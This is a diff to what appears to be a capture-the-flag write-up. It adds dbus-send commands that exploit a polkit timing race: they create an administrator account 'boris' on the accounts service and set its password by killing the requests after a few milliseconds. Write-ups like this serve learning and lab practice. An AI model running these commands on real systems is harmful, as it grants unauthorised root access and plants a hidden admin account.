@@ -61,7 +61,21 @@
 
 <br/><br/>
 
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
 
+
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.031s ; kill $!
+
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$7Bmgdl.nOd4aCvZT$aJYFtjdy7Q1k4nj4BYOmkLJwy9LRyHKANHlGwDtXgz2' string:GoldenEye & sleep 0.037s ; kill $!
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye & sleep 0.004s ; kill $!
+
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$DZLSLHAIcAsGYarl$J31FNwHG4ZOf7hu0.LmuX13.y1xl9xz8HnySsPaMaK7' string:GoldenEye & sleep 0.035s ; kill $!
+
+$5$1dKf1P7dhcB2i1QA$PQJrOE013sKIrqLOaWbdPTWpFFW0qhJV2f4ckr0WM28
 
 ## <span style="color:#CC6699">How Did I Solve the Machine 😎🥳 
 
